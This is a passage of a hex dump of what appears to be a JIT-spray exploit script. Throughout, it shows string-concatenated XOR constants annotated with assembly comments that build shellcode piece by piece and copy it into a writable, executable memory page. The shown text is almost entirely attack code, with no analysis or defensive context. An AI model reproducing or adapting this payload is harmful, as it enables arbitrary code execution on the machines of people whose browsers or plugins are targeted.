00002240  5e 22 2b 20 2f 2f 20 6d  6f 76 20 61 68 2c 20 66  |^"+ // mov ah, f|
00002250  61 0d 0a 22 30 78 31 34  65 62 32 39 62 30 5e 22  |a.."0x14eb29b0^"|
00002260  2b 20 2f 2f 20 6d 6f 76  20 61 6c 2c 20 32 39 0d  |+ // mov al, 29.|
00002270  0a 22 30 78 31 34 65 62  65 30 66 37 5e 22 2b 20  |."0x14ebe0f7^"+ |
00002280  2f 2f 20 45 41 58 0d 0a  22 30 78 31 34 65 62 66  |// EAX.."0x14ebf|
00002290  66 62 34 5e 22 2b 20 2f  2f 20 6d 6f 76 20 61 68  |fb4^"+ // mov ah|
000022a0  2c 20 66 66 0d 0a 22 30  78 31 34 65 62 66 66 62  |, ff.."0x14ebffb|
000022b0  30 5e 22 2b 20 2f 2f 20  6d 6f 76 20 61 6c 2c 20  |0^"+ // mov al, |
000022c0  66 66 0d 0a 22 30 78 31  34 65 62 34 30 39 30 5e  |ff.."0x14eb4090^|
000022d0  22 2b 20 2f 2f 20 69 6e  63 20 65 61 78 0d 0a 22  |"+ // inc eax.."|
000022e0  30 78 31 34 65 62 65 30  62 34 5e 22 2b 20 2f 2f  |0x14ebe0b4^"+ //|
000022f0  20 6d 6f 76 20 61 68 2c  20 65 30 0d 0a 22 30 78  | mov ah, e0.."0x|
00002300  31 34 65 62 33 38 62 30  5e 22 2b 20 2f 2f 20 6d  |14eb38b0^"+ // m|
00002310  6f 76 20 61 6c 2c 20 33  38 0d 0a 22 30 78 31 34  |ov al, 38.."0x14|
00002320  65 62 63 62 30 33 5e 22  2b 20 2f 2f 20 61 64 64  |ebcb03^"+ // add|
00002330  20 65 63 78 2c 20 65 62  78 20 3b 20 65 63 78 3d  | ecx, ebx ; ecx=|
00002340  65 63 78 2b 34 20 2d 20  6d 6f 76 65 20 70 6f 69  |ecx+4 - move poi|
00002350  6e 74 65 72 0d 0a 22 30  78 31 34 65 62 30 31 38  |nter.."0x14eb018|
00002360  39 5e 22 2b 20 2f 2f 20  6d 6f 76 20 5b 65 63 78  |9^"+ // mov [ecx|
00002370  5d 2c 20 65 61 78 20 3b  20 63 6f 70 79 20 70 61  |], eax ; copy pa|
00002380  72 74 20 6f 66 20 73 68  65 6c 6c 63 6f 64 65 20  |rt of shellcode |
00002390  74 6f 20 52 57 58 20 70  61 67 65 0d 0a 20 0d 0a  |to RWX page.. ..|
000023a0  22 30 78 31 34 65 62 63  30 33 31 5e 22 2b 20 2f  |"0x14ebc031^"+ /|
000023b0  2f 20 78 6f 72 20 65 61  78 2c 65 61 78 0d 0a 22  |/ xor eax,eax.."|
000023c0  30 78 31 34 65 62 37 62  62 34 5e 22 2b 20 2f 2f  |0x14eb7bb4^"+ //|
000023d0  20 6d 6f 76 20 61 68 2c  20 37 62 0d 0a 22 30 78  | mov ah, 7b.."0x|
000023e0  31 34 65 62 65 38 62 30  5e 22 2b 20 2f 2f 20 6d  |14ebe8b0^"+ // m|
000023f0  6f 76 20 61 6c 2c 20 65  38 0d 0a 22 30 78 31 34  |ov al, e8.."0x14|
00002400  65 62 65 30 66 37 5e 22  2b 20 2f 2f 20 45 41 58  |ebe0f7^"+ // EAX|
00002410  0d 0a 22 30 78 31 34 65  62 37 64 62 34 5e 22 2b  |.."0x14eb7db4^"+|
00002420  20 2f 2f 20 6d 6f 76 20  61 68 2c 20 37 64 0d 0a  | // mov ah, 7d..|
00002430  22 30 78 31 34 65 62 30  33 62 30 5e 22 2b 20 2f  |"0x14eb03b0^"+ /|
00002440  2f 20 6d 6f 76 20 61 6c  2c 20 30 33 0d 0a 22 30  |/ mov al, 03.."0|
00002450  78 31 34 65 62 63 62 30  33 5e 22 2b 20 2f 2f 20  |x14ebcb03^"+ // |
00002460  61 64 64 20 65 63 78 2c  20 65 62 78 20 3b 20 65  |add ecx, ebx ; e|
00002470  63 78 3d 65 63 78 2b 34  20 2d 20 6d 6f 76 65 20  |cx=ecx+4 - move |
00002480  70 6f 69 6e 74 65 72 0d  0a 22 30 78 31 34 65 62  |pointer.."0x14eb|
00002490  30 31 38 39 5e 22 2b 20  2f 2f 20 6d 6f 76 20 5b  |0189^"+ // mov [|
000024a0  65 63 78 5d 2c 20 65 61  78 20 3b 20 63 6f 70 79  |ecx], eax ; copy|
000024b0  20 70 61 72 74 20 6f 66  20 73 68 65 6c 6c 63 6f  | part of shellco|
000024c0  64 65 20 74 6f 20 52 57  58 20 70 61 67 65 0d 0a  |de to RWX page..|
000024d0  20 0d 0a 22 30 78 31 34  65 62 63 30 33 31 5e 22  | .."0x14ebc031^"|
000024e0  2b 20 2f 2f 20 78 6f 72  20 65 61 78 2c 65 61 78  |+ // xor eax,eax|
000024f0  0d 0a 22 30 78 31 34 65  62 66 30 62 34 5e 22 2b  |.."0x14ebf0b4^"+|
00002500  20 2f 2f 20 6d 6f 76 20  61 68 2c 20 66 30 0d 0a  | // mov ah, f0..|
00002510  22 30 78 31 34 65 62 63  37 62 30 5e 22 2b 20 2f  |"0x14ebc7b0^"+ /|
00002520  2f 20 6d 6f 76 20 61 6c  2c 20 63 37 0d 0a 22 30  |/ mov al, c7.."0|
00002530  78 31 34 65 62 65 30 66  37 5e 22 2b 20 2f 2f 20  |x14ebe0f7^"+ // |
00002540  45 41 58 0d 0a 22 30 78  31 34 65 62 32 34 62 34  |EAX.."0x14eb24b4|
00002550  5e 22 2b 20 2f 2f 20 6d  6f 76 20 61 68 2c 20 32  |^"+ // mov ah, 2|
00002560  34 0d 0a 22 30 78 31 34  65 62 37 64 62 30 5e 22  |4.."0x14eb7db0^"|
00002570  2b 20 2f 2f 20 6d 6f 76  20 61 6c 2c 20 37 64 0d  |+ // mov al, 7d.|
00002580  0a 22 30 78 31 34 65 62  63 62 30 33 5e 22 2b 20  |."0x14ebcb03^"+ |
00002590  2f 2f 20 61 64 64 20 65  63 78 2c 20 65 62 78 20  |// add ecx, ebx |
000025a0  3b 20 65 63 78 3d 65 63  78 2b 34 20 2d 20 6d 6f  |; ecx=ecx+4 - mo|
000025b0  76 65 20 70 6f 69 6e 74  65 72 0d 0a 22 30 78 31  |ve pointer.."0x1|
000025c0  34 65 62 30 31 38 39 5e  22 2b 20 2f 2f 20 6d 6f  |4eb0189^"+ // mo|
000025d0  76 20 5b 65 63 78 5d 2c  20 65 61 78 20 3b 20 63  |v [ecx], eax ; c|
000025e0  6f 70 79 20 70 61 72 74  20 6f 66 20 73 68 65 6c  |opy part of shel|
000025f0  6c 63 6f 64 65 20 74 6f  20 52 57 58 20 70 61 67  |lcode to RWX pag|
00002600  65 0d 0a 20 0d 0a 22 30  78 31 34 65 62 63 30 33  |e.. .."0x14ebc03|
00002610  31 5e 22 2b 20 2f 2f 20  78 6f 72 20 65 61 78 2c  |1^"+ // xor eax,|
00002620  65 61 78 0d 0a 22 30 78  31 34 65 62 36 30 62 34  |eax.."0x14eb60b4|
00002630  5e 22 2b 20 2f 2f 20 6d  6f 76 20 61 68 2c 20 36  |^"+ // mov ah, 6|
00002640  30 0d 0a 22 30 78 31 34  65 62 37 36 62 30 5e 22  |0.."0x14eb76b0^"|
00002650  2b 20 2f 2f 20 6d 6f 76  20 61 6c 2c 20 37 36 0d  |+ // mov al, 76.|
00002660  0a 22 30 78 31 34 65 62  65 30 66 37 5e 22 2b 20  |."0x14ebe0f7^"+ |
00002670  2f 2f 20 45 41 58 0d 0a  22 30 78 31 34 65 62 38  |// EAX.."0x14eb8|
00002680  62 62 34 5e 22 2b 20 2f  2f 20 6d 6f 76 20 61 68  |bb4^"+ // mov ah|
00002690  2c 20 38 62 0d 0a 22 30  78 31 34 65 62 35 38 62  |, 8b.."0x14eb58b|
000026a0  30 5e 22 2b 20 2f 2f 20  6d 6f 76 20 61 6c 2c 20  |0^"+ // mov al, |
000026b0  35 38 0d 0a 22 30 78 31  34 65 62 63 62 30 33 5e  |58.."0x14ebcb03^|
000026c0  22 2b 20 2f 2f 20 61 64  64 20 65 63 78 2c 20 65  |"+ // add ecx, e|
000026d0  62 78 20 3b 20 65 63 78  3d 65 63 78 2b 34 20 2d  |bx ; ecx=ecx+4 -|
000026e0  20 6d 6f 76 65 20 70 6f  69 6e 74 65 72 0d 0a 22  | move pointer.."|
000026f0  30 78 31 34 65 62 30 31  38 39 5e 22 2b 20 2f 2f  |0x14eb0189^"+ //|
00002700  20 6d 6f 76 20 5b 65 63  78 5d 2c 20 65 61 78 20  | mov [ecx], eax |
00002710  3b 20 63 6f 70 79 20 70  61 72 74 20 6f 66 20 73  |; copy part of s|
00002720  68 65 6c 6c 63 6f 64 65  20 74 6f 20 52 57 58 20  |hellcode to RWX |
00002730  70 61 67 65 0d 0a 20 0d  0a 22 30 78 31 34 65 62  |page.. .."0x14eb|
00002740  63 30 33 31 5e 22 2b 20  2f 2f 20 78 6f 72 20 65  |c031^"+ // xor e|
00002750  61 78 2c 65 61 78 0d 0a  22 30 78 31 34 65 62 62  |ax,eax.."0x14ebb|
00002760  63 62 34 5e 22 2b 20 2f  2f 20 6d 6f 76 20 61 68  |cb4^"+ // mov ah|
00002770  2c 20 62 63 0d 0a 22 30  78 31 34 65 62 65 38 62  |, bc.."0x14ebe8b|
00002780  30 5e 22 2b 20 2f 2f 20  6d 6f 76 20 61 6c 2c 20  |0^"+ // mov al, |
00002790  65 38 0d 0a 22 30 78 31  34 65 62 65 30 66 37 5e  |e8.."0x14ebe0f7^|
000027a0  22 2b 20 2f 2f 20 45 41  58 0d 0a 22 30 78 31 34  |"+ // EAX.."0x14|
000027b0  65 62 66 66 62 34 5e 22  2b 20 2f 2f 20 6d 6f 76  |ebffb4^"+ // mov|
000027c0  20 61 68 2c 20 66 66 0d  0a 22 30 78 31 34 65 62  | ah, ff.."0x14eb|
000027d0  66 66 62 30 5e 22 2b 20  2f 2f 20 6d 6f 76 20 61  |ffb0^"+ // mov a|
000027e0  6c 2c 20 66 66 0d 0a 22  30 78 31 34 65 62 34 30  |l, ff.."0x14eb40|
000027f0  39 30 5e 22 2b 20 2f 2f  20 69 6e 63 20 65 61 78  |90^"+ // inc eax|
00002800  0d 0a 22 30 78 31 34 65  62 64 33 62 34 5e 22 2b  |.."0x14ebd3b4^"+|
00002810  20 2f 2f 20 6d 6f 76 20  61 68 2c 20 64 33 0d 0a  | // mov ah, d3..|
00002820  22 30 78 31 34 65 62 30  31 62 30 5e 22 2b 20 2f  |"0x14eb01b0^"+ /|
00002830  2f 20 6d 6f 76 20 61 6c  2c 20 30 31 0d 0a 22 30  |/ mov al, 01.."0|
00002840  78 31 34 65 62 63 62 30  33 5e 22 2b 20 2f 2f 20  |x14ebcb03^"+ // |
00002850  61 64 64 20 65 63 78 2c  20 65 62 78 20 3b 20 65  |add ecx, ebx ; e|
00002860  63 78 3d 65 63 78 2b 34  20 2d 20 6d 6f 76 65 20  |cx=ecx+4 - move |
00002870  70 6f 69 6e 74 65 72 0d  0a 22 30 78 31 34 65 62  |pointer.."0x14eb|
00002880  30 31 38 39 5e 22 2b 20  2f 2f 20 6d 6f 76 20 5b  |0189^"+ // mov [|
00002890  65 63 78 5d 2c 20 65 61  78 20 3b 20 63 6f 70 79  |ecx], eax ; copy|
000028a0  20 70 61 72 74 20 6f 66  20 73 68 65 6c 6c 63 6f  | part of shellco|
000028b0  64 65 20 74 6f 20 52 57  58 20 70 61 67 65 0d 0a  |de to RWX page..|
000028c0  20 0d 0a 22 30 78 31 34  65 62 63 30 33 31 5e 22  | .."0x14ebc031^"|
000028d0  2b 20 2f 2f 20 78 6f 72  20 65 61 78 2c 65 61 78  |+ // xor eax,eax|
000028e0  0d 0a 22 30 78 31 34 65  62 39 36 62 34 5e 22 2b  |.."0x14eb96b4^"+|
000028f0  20 2f 2f 20 6d 6f 76 20  61 68 2c 20 39 36 0d 0a  | // mov ah, 96..|
00002900  22 30 78 31 34 65 62 38  66 62 30 5e 22 2b 20 2f  |"0x14eb8fb0^"+ /|
00002910  2f 20 6d 6f 76 20 61 6c  2c 20 38 66 0d 0a 22 30  |/ mov al, 8f.."0|
00002920  78 31 34 65 62 65 30 66  37 5e 22 2b 20 2f 2f 20  |x14ebe0f7^"+ // |
00002930  45 41 58 0d 0a 22 30 78  31 34 65 62 34 62 62 34  |EAX.."0x14eb4bb4|
00002940  5e 22 2b 20 2f 2f 20 6d  6f 76 20 61 68 2c 20 34  |^"+ // mov ah, 4|
00002950  62 0d 0a 22 30 78 31 34  65 62 30 63 62 30 5e 22  |b.."0x14eb0cb0^"|
00002960  2b 20 2f 2f 20 6d 6f 76  20 61 6c 2c 20 30 63 0d  |+ // mov al, 0c.|
00002970  0a 22 30 78 31 34 65 62  63 62 30 33 5e 22 2b 20  |."0x14ebcb03^"+ |
00002980  2f 2f 20 61 64 64 20 65  63 78 2c 20 65 62 78 20  |// add ecx, ebx |
00002990  3b 20 65 63 78 3d 65 63  78 2b 34 20 2d 20 6d 6f  |; ecx=ecx+4 - mo|
000029a0  76 65 20 70 6f 69 6e 74  65 72 0d 0a 22 30 78 31  |ve pointer.."0x1|
000029b0  34 65 62 30 31 38 39 5e  22 2b 20 2f 2f 20 6d 6f  |4eb0189^"+ // mo|
000029c0  76 20 5b 65 63 78 5d 2c  20 65 61 78 20 3b 20 63  |v [ecx], eax ; c|
000029d0  6f 70 79 20 70 61 72 74  20 6f 66 20 73 68 65 6c  |opy part of shel|
000029e0  6c 63 6f 64 65 20 74 6f  20 52 57 58 20 70 61 67  |lcode to RWX pag|
000029f0  65 0d 0a 20 0d 0a 22 30  78 31 34 65 62 63 30 33  |e.. .."0x14ebc03|
00002a00  31 5e 22 2b 20 2f 2f 20  78 6f 72 20 65 61 78 2c  |1^"+ // xor eax,|
00002a10  65 61 78 0d 0a 22 30 78  31 34 65 62 62 64 62 34  |eax.."0x14ebbdb4|
00002a20  5e 22 2b 20 2f 2f 20 6d  6f 76 20 61 68 2c 20 62  |^"+ // mov ah, b|
00002a30  64 0d 0a 22 30 78 31 34  65 62 33 32 62 30 5e 22  |d.."0x14eb32b0^"|
00002a40  2b 20 2f 2f 20 6d 6f 76  20 61 6c 2c 20 33 32 0d  |+ // mov al, 32.|
00002a50  0a 22 30 78 31 34 65 62  65 30 66 37 5e 22 2b 20  |."0x14ebe0f7^"+ |
00002a60  2f 2f 20 45 41 58 0d 0a  22 30 78 31 34 65 62 66  |// EAX.."0x14ebf|
00002a70  66 62 34 5e 22 2b 20 2f  2f 20 6d 6f 76 20 61 68  |fb4^"+ // mov ah|
00002a80  2c 20 66 66 0d 0a 22 30  78 31 34 65 62 66 66 62  |, ff.."0x14ebffb|
00002a90  30 5e 22 2b 20 2f 2f 20  6d 6f 76 20 61 6c 2c 20  |0^"+ // mov al, |
00002aa0  66 66 0d 0a 22 30 78 31  34 65 62 34 30 39 30 5e  |ff.."0x14eb4090^|
00002ab0  22 2b 20 2f 2f 20 69 6e  63 20 65 61 78 0d 0a 22  |"+ // inc eax.."|
00002ac0  30 78 31 34 65 62 30 31  62 34 5e 22 2b 20 2f 2f  |0x14eb01b4^"+ //|
00002ad0  20 6d 6f 76 20 61 68 2c  20 30 31 0d 0a 22 30 78  | mov ah, 01.."0x|
00002ae0  31 34 65 62 31 63 62 30  5e 22 2b 20 2f 2f 20 6d  |14eb1cb0^"+ // m|
00002af0  6f 76 20 61 6c 2c 20 31  63 0d 0a 22 30 78 31 34  |ov al, 1c.."0x14|
00002b00  65 62 63 62 30 33 5e 22  2b 20 2f 2f 20 61 64 64  |ebcb03^"+ // add|
00002b10  20 65 63 78 2c 20 65 62  78 20 3b 20 65 63 78 3d  | ecx, ebx ; ecx=|
00002b20  65 63 78 2b 34 20 2d 20  6d 6f 76 65 20 70 6f 69  |ecx+4 - move poi|
00002b30  6e 74 65 72 0d 0a 22 30  78 31 34 65 62 30 31 38  |nter.."0x14eb018|
00002b40  39 5e 22 2b 20 2f 2f 20  6d 6f 76 20 5b 65 63 78  |9^"+ // mov [ecx|
00002b50  5d 2c 20 65 61 78 20 3b  20 63 6f 70 79 20 70 61  |], eax ; copy pa|
00002b60  72 74 20 6f 66 20 73 68  65 6c 6c 63 6f 64 65 20  |rt of shellcode |
00002b70  74 6f 20 52 57 58 20 70  61 67 65 0d 0a 20 0d 0a  |to RWX page.. ..|
00002b80  22 30 78 31 34 65 62 63  30 33 31 5e 22 2b 20 2f  |"0x14ebc031^"+ /|
00002b90  2f 20 78 6f 72 20 65 61  78 2c 65 61 78 0d 0a 22  |/ xor eax,eax.."|
00002ba0  30 78 31 34 65 62 65 36  62 34 5e 22 2b 20 2f 2f  |0x14ebe6b4^"+ //|
00002bb0  20 6d 6f 76 20 61 68 2c  20 65 36 0d 0a 22 30 78  | mov ah, e6.."0x|
00002bc0  31 34 65 62 63 32 62 30  5e 22 2b 20 2f 2f 20 6d  |14ebc2b0^"+ // m|
00002bd0  6f 76 20 61 6c 2c 20 63  32 0d 0a 22 30 78 31 34  |ov al, c2.."0x14|
00002be0  65 62 65 30 66 37 5e 22  2b 20 2f 2f 20 45 41 58  |ebe0f7^"+ // EAX|
00002bf0  0d 0a 22 30 78 31 34 65  62 38 62 62 34 5e 22 2b  |.."0x14eb8bb4^"+|
00002c00  20 2f 2f 20 6d 6f 76 20  61 68 2c 20 38 62 0d 0a  | // mov ah, 8b..|
00002c10  22 30 78 31 34 65 62 30  34 62 30 5e 22 2b 20 2f  |"0x14eb04b0^"+ /|
00002c20  2f 20 6d 6f 76 20 61 6c  2c 20 30 34 0d 0a 22 30  |/ mov al, 04.."0|
00002c30  78 31 34 65 62 63 62 30  33 5e 22 2b 20 2f 2f 20  |x14ebcb03^"+ // |
00002c40  61 64 64 20 65 63 78 2c  20 65 62 78 20 3b 20 65  |add ecx, ebx ; e|
00002c50  63 78 3d 65 63 78 2b 34  20 2d 20 6d 6f 76 65 20  |cx=ecx+4 - move |
00002c60  70 6f 69 6e 74 65 72 0d  0a 22 30 78 31 34 65 62  |pointer.."0x14eb|
00002c70  30 31 38 39 5e 22 2b 20  2f 2f 20 6d 6f 76 20 5b  |0189^"+ // mov [|
00002c80  65 63 78 5d 2c 20 65 61  78 20 3b 20 63 6f 70 79  |ecx], eax ; copy|
00002c90  20 70 61 72 74 20 6f 66  20 73 68 65 6c 6c 63 6f  | part of shellco|
00002ca0  64 65 20 74 6f 20 52 57  58 20 70 61 67 65 0d 0a  |de to RWX page..|
00002cb0  20 0d 0a 22 30 78 31 34  65 62 63 30 33 31 5e 22  | .."0x14ebc031^"|
00002cc0  2b 20 2f 2f 20 78 6f 72  20 65 61 78 2c 65 61 78  |+ // xor eax,eax|
00002cd0  0d 0a 22 30 78 31 34 65  62 36 30 62 34 5e 22 2b  |.."0x14eb60b4^"+|
00002ce0  20 2f 2f 20 6d 6f 76 20  61 68 2c 20 36 30 0d 0a  | // mov ah, 60..|
00002cf0  22 30 78 31 34 65 62 33  30 62 30 5e 22 2b 20 2f  |"0x14eb30b0^"+ /|
00002d00  2f 20 6d 6f 76 20 61 6c  2c 20 33 30 0d 0a 22 30  |/ mov al, 30.."0|
00002d10  78 31 34 65 62 65 30 66  37 5e 22 2b 20 2f 2f 20  |x14ebe0f7^"+ // |
00002d20  45 41 58 0d 0a 22 30 78  31 34 65 62 34 34 62 34  |EAX.."0x14eb44b4|
00002d30  5e 22 2b 20 2f 2f 20 6d  6f 76 20 61 68 2c 20 34  |^"+ // mov ah, 4|
00002d40  34 0d 0a 22 30 78 31 34  65 62 38 39 62 30 5e 22  |4.."0x14eb89b0^"|
00002d50  2b 20 2f 2f 20 6d 6f 76  20 61 6c 2c 20 38 39 0d  |+ // mov al, 89.|
00002d60  0a 22 30 78 31 34 65 62  63 62 30 33 5e 22 2b 20  |."0x14ebcb03^"+ |
00002d70  2f 2f 20 61 64 64 20 65  63 78 2c 20 65 62 78 20  |// add ecx, ebx |
00002d80  3b 20 65 63 78 3d 65 63  78 2b 34 20 2d 20 6d 6f  |; ecx=ecx+4 - mo|
00002d90  76 65 20 70 6f 69 6e 74  65 72 0d 0a 22 30 78 31  |ve pointer.."0x1|
00002da0  34 65 62 30 31 38 39 5e  22 2b 20 2f 2f 20 6d 6f  |4eb0189^"+ // mo|
00002db0  76 20 5b 65 63 78 5d 2c  20 65 61 78 20 3b 20 63  |v [ecx], eax ; c|
00002dc0  6f 70 79 20 70 61 72 74  20 6f 66 20 73 68 65 6c  |opy part of shel|
00002dd0  6c 63 6f 64 65 20 74 6f  20 52 57 58 20 70 61 67  |lcode to RWX pag|
00002de0  65 0d 0a 20 0d 0a 20 0d  0a 22 30 78 31 34 65 62  |e.. .. .."0x14eb|
00002df0  63 30 33 31 5e 22 2b 20  2f 2f 20 78 6f 72 20 65  |c031^"+ // xor e|
00002e00  61 78 2c 65 61 78 0d 0a  22 30 78 31 34 65 62 39  |ax,eax.."0x14eb9|
00002e10  37 62 34 5e 22 2b 20 2f  2f 20 6d 6f 76 20 61 68  |7b4^"+ // mov ah|
00002e20  2c 20 39 37 0d 0a 22 30  78 31 34 65 62 34 34 62  |, 97.."0x14eb44b|
00002e30  30 5e 22 2b 20 2f 2f 20  6d 6f 76 20 61 6c 2c 20  |0^"+ // mov al, |
00002e40  34 34 0d 0a 22 30 78 31  34 65 62 65 30 66 37 5e  |44.."0x14ebe0f7^|
00002e50  22 2b 20 2f 2f 20 45 41  58 0d 0a 22 30 78 31 34  |"+ // EAX.."0x14|
00002e60  65 62 35 62 62 34 5e 22  2b 20 2f 2f 20 6d 6f 76  |eb5bb4^"+ // mov|
00002e70  20 61 68 2c 20 35 62 0d  0a 22 30 78 31 34 65 62  | ah, 5b.."0x14eb|
00002e80  35 62 62 30 5e 22 2b 20  2f 2f 20 6d 6f 76 20 61  |5bb0^"+ // mov a|
00002e90  6c 2c 20 35 62 0d 0a 22  30 78 31 34 65 62 63 62  |l, 5b.."0x14ebcb|
00002ea0  30 33 5e 22 2b 20 2f 2f  20 61 64 64 20 65 63 78  |03^"+ // add ecx|
00002eb0  2c 20 65 62 78 20 3b 20  65 63 78 3d 65 63 78 2b  |, ebx ; ecx=ecx+|
00002ec0  34 20 2d 20 6d 6f 76 65  20 70 6f 69 6e 74 65 72  |4 - move pointer|
00002ed0  0d 0a 22 30 78 31 34 65  62 30 31 38 39 5e 22 2b  |.."0x14eb0189^"+|
00002ee0  20 2f 2f 20 6d 6f 76 20  5b 65 63 78 5d 2c 20 65  | // mov [ecx], e|
00002ef0  61 78 20 3b 20 63 6f 70  79 20 70 61 72 74 20 6f  |ax ; copy part o|
00002f00  66 20 73 68 65 6c 6c 63  6f 64 65 20 74 6f 20 52  |f shellcode to R|
00002f10  57 58 20 70 61 67 65 0d  0a 20 0d 0a 22 30 78 31  |WX page.. .."0x1|
00002f20  34 65 62 63 30 33 31 5e  22 2b 20 2f 2f 20 78 6f  |4ebc031^"+ // xo|
00002f30  72 20 65 61 78 2c 65 61  78 0d 0a 22 30 78 31 34  |r eax,eax.."0x14|
00002f40  65 62 65 66 62 34 5e 22  2b 20 2f 2f 20 6d 6f 76  |ebefb4^"+ // mov|
00002f50  20 61 68 2c 20 65 66 0d  0a 22 30 78 31 34 65 62  | ah, ef.."0x14eb|
00002f60  66 66 62 30 5e 22 2b 20  2f 2f 20 6d 6f 76 20 61  |ffb0^"+ // mov a|
00002f70  6c 2c 20 66 66 0d 0a 22  30 78 31 34 65 62 65 30  |l, ff.."0x14ebe0|
00002f80  66 37 5e 22 2b 20 2f 2f  20 45 41 58 0d 0a 22 30  |f7^"+ // EAX.."0|
00002f90  78 31 34 65 62 66 66 62  34 5e 22 2b 20 2f 2f 20  |x14ebffb4^"+ // |
00002fa0  6d 6f 76 20 61 68 2c 20  66 66 0d 0a 22 30 78 31  |mov ah, ff.."0x1|
00002fb0  34 65 62 66 66 62 30 5e  22 2b 20 2f 2f 20 6d 6f  |4ebffb0^"+ // mo|
00002fc0  76 20 61 6c 2c 20 66 66  0d 0a 22 30 78 31 34 65  |v al, ff.."0x14e|
00002fd0  62 34 30 39 30 5e 22 2b  20 2f 2f 20 69 6e 63 20  |b4090^"+ // inc |
00002fe0  65 61 78 0d 0a 22 30 78  31 34 65 62 35 31 62 34  |eax.."0x14eb51b4|
00002ff0  5e 22 2b 20 2f 2f 20 6d  6f 76 20 61 68 2c 20 35  |^"+ // mov ah, 5|
00003000  31 0d 0a 22 30 78 31 34  65 62 35 61 62 30 5e 22  |1.."0x14eb5ab0^"|
00003010  2b 20 2f 2f 20 6d 6f 76  20 61 6c 2c 20 35 61 0d  |+ // mov al, 5a.|
00003020  0a 22 30 78 31 34 65 62  63 62 30 33 5e 22 2b 20  |."0x14ebcb03^"+ |
00003030  2f 2f 20 61 64 64 20 65  63 78 2c 20 65 62 78 20  |// add ecx, ebx |
00003040  3b 20 65 63 78 3d 65 63  78 2b 34 20 2d 20 6d 6f  |; ecx=ecx+4 - mo|
00003050  76 65 20 70 6f 69 6e 74  65 72 0d 0a 22 30 78 31  |ve pointer.."0x1|
00003060  34 65 62 30 31 38 39 5e  22 2b 20 2f 2f 20 6d 6f  |4eb0189^"+ // mo|
00003070  76 20 5b 65 63 78 5d 2c  20 65 61 78 20 3b 20 63  |v [ecx], eax ; c|
00003080  6f 70 79 20 70 61 72 74  20 6f 66 20 73 68 65 6c  |opy part of shel|
00003090  6c 63 6f 64 65 20 74 6f  20 52 57 58 20 70 61 67  |lcode to RWX pag|
000030a0  65 0d 0a 20 0d 0a 22 30  78 31 34 65 62 63 30 33  |e.. .."0x14ebc03|
000030b0  31 5e 22 2b 20 2f 2f 20  78 6f 72 20 65 61 78 2c  |1^"+ // xor eax,|
000030c0  65 61 78 0d 0a 22 30 78  31 34 65 62 62 63 62 34  |eax.."0x14ebbcb4|
000030d0  5e 22 2b 20 2f 2f 20 6d  6f 76 20 61 68 2c 20 62  |^"+ // mov ah, b|
000030e0  63 0d 0a 22 30 78 31 34  65 62 65 30 62 30 5e 22  |c.."0x14ebe0b0^"|
000030f0  2b 20 2f 2f 20 6d 6f 76  20 61 6c 2c 20 65 30 0d  |+ // mov al, e0.|
00003100  0a 22 30 78 31 34 65 62  65 30 66 37 5e 22 2b 20  |."0x14ebe0f7^"+ |
00003110  2f 2f 20 45 41 58 0d 0a  22 30 78 31 34 65 62 66  |// EAX.."0x14ebf|
00003120  66 62 34 5e 22 2b 20 2f  2f 20 6d 6f 76 20 61 68  |fb4^"+ // mov ah|
00003130  2c 20 66 66 0d 0a 22 30  78 31 34 65 62 66 66 62  |, ff.."0x14ebffb|
00003140  30 5e 22 2b 20 2f 2f 20  6d 6f 76 20 61 6c 2c 20  |0^"+ // mov al, |
00003150  66 66 0d 0a 22 30 78 31  34 65 62 34 30 39 30 5e  |ff.."0x14eb4090^|
00003160  22 2b 20 2f 2f 20 69 6e  63 20 65 61 78 0d 0a 22  |"+ // inc eax.."|
00003170  30 78 31 34 65 62 35 66  62 34 5e 22 2b 20 2f 2f  |0x14eb5fb4^"+ //|
00003180  20 6d 6f 76 20 61 68 2c  20 35 66 0d 0a 22 30 78  | mov ah, 5f.."0x|
00003190  31 34 65 62 35 38 62 30  5e 22 2b 20 2f 2f 20 6d  |14eb58b0^"+ // m|
000031a0  6f 76 20 61 6c 2c 20 35  38 0d 0a 22 30 78 31 34  |ov al, 58.."0x14|
000031b0  65 62 63 62 30 33 5e 22  2b 20 2f 2f 20 61 64 64  |ebcb03^"+ // add|
000031c0  20 65 63 78 2c 20 65 62  78 20 3b 20 65 63 78 3d  | ecx, ebx ; ecx=|
000031d0  65 63 78 2b 34 20 2d 20  6d 6f 76 65 20 70 6f 69  |ecx+4 - move poi|
000031e0  6e 74 65 72 0d 0a 22 30  78 31 34 65 62 30 31 38  |nter.."0x14eb018|
000031f0  39 5e 22 2b 20 2f 2f 20  6d 6f 76 20 5b 65 63 78  |9^"+ // mov [ecx|
00003200  5d 2c 20 65 61 78 20 3b  20 63 6f 70 79 20 70 61  |], eax ; copy pa|
00003210  72 74 20 6f 66 20 73 68  65 6c 6c 63 6f 64 65 20  |rt of shellcode |
00003220  74 6f 20 52 57 58 20 70  61 67 65 0d 0a 20 0d 0a  |to RWX page.. ..|
00003230  20 0d 0a 22 30 78 31 34  65 62 63 30 33 31 5e 22  | .."0x14ebc031^"|
00003240  2b 20 2f 2f 20 78 6f 72  20 65 61 78 2c 65 61 78  |+ // xor eax,eax|
00003250  0d 0a 22 30 78 31 34 65  62 39 61 62 34 5e 22 2b  |.."0x14eb9ab4^"+|
00003260  20 2f 2f 20 6d 6f 76 20  61 68 2c 20 39 61 0d 0a  | // mov ah, 9a..|
00003270  22 30 78 31 34 65 62 62  63 62 30 5e 22 2b 20 2f  |"0x14ebbcb0^"+ /|
00003280  2f 20 6d 6f 76 20 61 6c  2c 20 62 63 0d 0a 22 30  |/ mov al, bc.."0|
00003290  78 31 34 65 62 65 30 66  37 5e 22 2b 20 2f 2f 20  |x14ebe0f7^"+ // |
000032a0  45 41 58 0d 0a 22 30 78  31 34 65 62 65 62 62 34  |EAX.."0x14ebebb4|
000032b0  5e 22 2b 20 2f 2f 20 6d  6f 76 20 61 68 2c 20 65  |^"+ // mov ah, e|
000032c0  62 0d 0a 22 30 78 31 34  65 62 31 32 62 30 5e 22  |b.."0x14eb12b0^"|
000032d0  2b 20 2f 2f 20 6d 6f 76  20 61 6c 2c 20 31 32 0d  |+ // mov al, 12.|
000032e0  0a 22 30 78 31 34 65 62  63 62 30 33 5e 22 2b 20  |."0x14ebcb03^"+ |
000032f0  2f 2f 20 61 64 64 20 65  63 78 2c 20 65 62 78 20  |// add ecx, ebx |
00003300  3b 20 65 63 78 3d 65 63  78 2b 34 20 2d 20 6d 6f  |; ecx=ecx+4 - mo|
